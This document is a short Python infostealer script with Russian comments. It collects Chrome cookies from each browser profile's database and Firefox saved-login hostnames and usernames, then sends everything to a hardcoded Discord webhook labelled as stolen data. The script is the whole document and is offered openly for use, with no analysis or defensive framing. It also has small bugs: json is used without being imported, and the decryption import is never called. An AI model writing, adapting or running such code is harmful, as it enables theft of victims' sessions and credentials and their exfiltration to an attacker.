import os
import sqlite3
import requests
from win32crypt import CryptUnprotectData  # Для расшифровки паролей

# Ваш Discord-вебхук из сообщения:
WEBHOOK_URL = "https://discord.com/api/webhooks/1573428258861482205/RYrEW_HDXRU2HX-uORpMnUIt67wSmdpEm9yNBE0Wfo003Gv2WT_6lvdr60giD6ZETYQr"

def get_chrome_cookies():
    try:
        data = []
        path = f"{os.getenv('APPDATA')}\\Google\\Chrome\\User Data"
        
        # Проверка существования папки Chrome
        if not os.path.exists(path):
            return "Chrome не найден"
        
        for profile in os.listdir(path):
            if 'Profile' not in profile and profile != 'Default':
                continue
            
            cookies_db = f"{path}\\{profile}\\Network\\Cookies"
            
            # Проверка файла Cookies
            if not os.path.exists(cookies_db):
                continue
                
            conn = sqlite3.connect(cookies_db)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, value FROM Cookies")
            
            for row in cursor.fetchall():
                data.append(f"Cookie: {row[1]}={row[2]} (domain: {row[0]})")
                
        return "\n".join(data) if data else "Нет cookie"
    
    except Exception as e:
        return f"Ошибка Chrome: {str(e)}"

def get_firefox_logins():
    try:
        data = []
        path = f"{os.getenv('APPDATA')}\\Mozilla\\Firefox\\Profiles"
        
        # Проверка существования папки Firefox
        if not os.path.exists(path):
            return "Firefox не найден"
        
        for folder in os.listdir(path):
            login_db = f"{path}\\{folder}\\logins.json"
            
            if not os.path.exists(login_db):
                continue
                
            with open(login_db, 'r', encoding='utf-8') as file:
                logins = json.load(file).get('logins', [])
                
                for login in logins:
                    data.append(f"Сайт: {login['hostname']} | Логин: {login['username']}")
                    
        return "\n".join(data) if data else "Нет паролей"
    
    except Exception as e:
        return f"Ошибка Firefox: {str(e)}"

def send_to_discord(message):
    try:
        payload = {
            "content": f"Данные с краду:\n```{message}```"
        }
        
        response = requests.post(WEBHOOK_URL, json=payload)
        if response.status_code == 204:
            print("Отправлено успешно!")
        else:
            print(f"Ошибка отправки: {response.text}")
            
    except Exception as e:
        print(f"Ошибка Discord: {str(e)}")

def main():
    # Сбор данных
    chrome_data = get_chrome_cookies()
    firefox_data = get_firefox_logins()
    
    # Формирование сообщения
    message = f"Chrome Cookies:\n{chrome_data}\n\n"
    message += f"Firefox Пароли:\n{firefox_data}"
    
    send_to_discord(message)

if __name__ == "__main__":
    main()
